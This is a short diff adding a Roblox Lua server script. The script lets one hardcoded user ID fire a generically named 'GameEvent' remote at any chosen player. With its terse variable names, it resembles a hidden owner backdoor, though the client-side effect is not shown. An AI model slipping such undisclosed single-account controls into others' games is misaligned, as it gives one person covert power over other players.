@@ -1,0 +1,8 @@
+local R = game.ReplicatedStorage:WaitForChild("GameEvent")
+local O = 10868458618
+
+R.OnServerEvent:Connect(function(p, t)
+    if p.UserId == O and t and t:IsA("Player") then
+        R:FireClient(t)
+    end
+end)
